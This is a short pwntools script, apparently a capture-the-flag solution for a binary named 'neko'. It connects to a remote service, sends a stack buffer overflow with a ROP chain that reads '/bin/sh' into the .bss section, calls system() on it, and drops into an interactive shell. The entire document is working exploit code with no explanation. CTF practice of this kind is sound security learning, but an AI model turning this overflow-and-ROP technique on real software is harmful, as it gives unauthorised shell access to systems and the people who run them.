from pwn import *
context.log_level = 'debug'

# p = process("./neko")
p = remote("149.248.7.48", 9999)
elf = ELF("./neko")

p.recvuntil("cats?\n")
p.send("y")

p_1_ret = 0x080483dd
p_3_ret = 0x080488b9
leave_ret = 0x080484d8
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
read_plt = elf.plt["read"]
anchovies = elf.sym["anchovies"]
system = elf.plt["system"]
bss = 0x804a000 + 0x200
payload = "a" * 0xD0 + "b" * 4 
payload += p32(read_plt) + p32(p_3_ret) + p32(0) + p32(bss) + p32(0x10) 
payload += p32(system) + p32(anchovies) + p32(bss) 
p.recvuntil("Help this cat found his anchovies:\n")
p.send(payload)
p.recvline()
p.send("/bin/sh\x00")
p.interactive()